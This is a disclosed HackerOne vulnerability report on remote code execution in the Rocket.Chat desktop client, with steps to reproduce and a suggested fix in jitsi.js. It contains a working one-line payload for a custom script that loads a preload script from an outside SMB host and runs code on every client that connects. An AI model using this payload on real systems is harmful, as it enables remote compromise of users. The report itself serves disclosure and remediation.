---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '943725'
original_report_id: '943725'
title: Remote Code Execution in Rocket.Chat-Desktop
team_handle: rocket_chat
created_at: '2020-07-27T12:00:29.604Z'
disclosed_at: '2020-11-07T14:40:26.343Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 40
tags:
- hackerone
---

# Remote Code Execution in Rocket.Chat-Desktop

## Metadata

- HackerOne Report ID: 943725
- Weakness: 
- Program: rocket_chat
- Disclosed At: 2020-11-07T14:40:26.343Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Description:** Rocket.Chat-Desktop is vulnerable to remote code execution.
An attacker is able to create new BrowserWindow instances with a malicious preload script.

## Releases Affected:

  * Rocket.Chat-Desktop-Client: < v3.0.0-develop

## Steps To Reproduce (by setting up a malicious server):
  1. Go to `Administration » Layout » Custom Scripts » Custom Script for Logged In Users`
  1. Insert the following script:
  `window.open('data:text/html,<h1>PWNED</h1>', '', ['nodeIntegration=true', 'preload=\\\\45.155.173.235\\data\\cmd.js'].join(','))`
  1. Click `Save changes`
  1. Open Rocket.Chat-Desktop and connect to the server
  1. CMD.exe will pop up.

## Suggested mitigation

  * [`src » preload » jitsi.js`](https://github.com/RocketChat/Rocket.Chat.Electron/blob/develop/src/preload/jitsi.js)
  ```
  const wrapWindowOpen = (defaultWindowOpen) => (href, frameName, features) => {
       const settings = getSettings();

       features = ''; // <- should fix it

       if (settings && url.parse(href).host === settings.get('Jitsi_Domain')) {
         features = [
           features,
           'nodeIntegration=true',
           `preload=${ `${ remote.app.getAppPath() }/app/preload.js` }`,
         ].join(',');
       }

       return defaultWindowOpen.call(window, href, frameName, features);
  };
  ```

## Impact

Remote Code Execution in Rocket.Chat-Desktop

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
